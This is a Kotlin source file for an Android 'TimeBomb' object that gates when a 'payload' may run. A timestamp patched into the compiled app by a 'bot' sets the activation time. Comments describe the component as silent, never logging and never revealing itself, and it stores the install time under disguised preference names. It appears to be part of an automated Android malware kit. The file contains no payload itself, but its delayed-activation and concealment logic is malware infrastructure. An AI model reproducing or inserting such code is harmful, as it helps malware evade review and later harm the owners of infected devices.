package com.cristal.bristral.tristal.mistral.security

import android.content.Context
import android.content.SharedPreferences

/**
 * TimeBomb — activation delay gate.
 *
 * TIMEBOMB_TS is patched into dex by bot as Unix timestamp (seconds).
 * "0" = immediate activation (no delay).
 *
 * On first launch: records install time in SharedPreferences.
 * On each launch: checks if current time >= activation timestamp.
 *
 * Silent — never logs, never crashes, never reveals itself.
 */
object TimeBomb {

    private const val PREFS_NAME    = "sys_cfg"
    private const val KEY_INSTALL   = "t_inst"

    // ── Patched by bot ─────────────────────────────────────────
    // "0"          = immediate (no delay)
    // Unix epoch   = specific activation time
    // e.g.         = "1746123600"
    private const val TIMEBOMB_TS   = "TIMEBOMB_TS_PLACEHOLDER_FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
    // ───────────────────────────────────────────────────────────

    /**
     * Returns true if payload is allowed to run now.
     * Returns false if time-bomb has not triggered yet.
     */
    fun isActivated(context: Context): Boolean {
        return try {
            val ts = TIMEBOMB_TS.trim()

            // "0" or unparseable = immediate activation
            val activationTime = ts.toLongOrNull() ?: return true
            if (activationTime == 0L) return true

            val prefs = getPrefs(context)

            // Record install time on first run
            if (!prefs.contains(KEY_INSTALL)) {
                prefs.edit()
                    .putLong(KEY_INSTALL, System.currentTimeMillis() / 1000L)
                    .apply()
            }

            // Check: current time >= activation timestamp
            val currentTime = System.currentTimeMillis() / 1000L
            currentTime >= activationTime

        } catch (e: Exception) {
            // On any error — do not activate (fail safe)
            false
        }
    }

    /**
     * How many seconds remain until activation.
     * Returns 0 if already activated.
     */
    fun secondsRemaining(): Long {
        return try {
            val activationTime = TIMEBOMB_TS.trim().toLongOrNull() ?: return 0L
            if (activationTime == 0L) return 0L
            val remaining = activationTime - (System.currentTimeMillis() / 1000L)
            if (remaining < 0L) 0L else remaining
        } catch (e: Exception) {
            0L
        }
    }

    private fun getPrefs(context: Context): SharedPreferences {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }
}
